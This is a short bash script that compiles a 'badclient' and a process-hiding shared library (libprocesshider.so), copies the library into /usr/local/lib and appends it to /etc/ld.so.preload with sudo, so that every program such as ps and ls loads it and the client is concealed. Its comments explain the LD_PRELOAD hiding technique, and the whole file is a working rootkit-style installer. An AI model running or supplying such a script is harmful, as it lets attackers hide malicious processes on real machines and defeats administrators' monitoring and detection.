#!/bin/bash

cd /home/badguy/victim

make

# fPIC - needs to run no matter where it gets loaded in memory, ldl - link dynamic link library
gcc -fPIC -shared -o libprocesshider.so processhider.c -ldl

echo "[+] badclient is running"

sudo cp libprocesshider.so /usr/local/lib/

# echo - forcing every ps, ls, ... to load my library first >> append preload - DL loads this library first
sudo sh -c 'echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload'

echo "[+] badclient is hidden"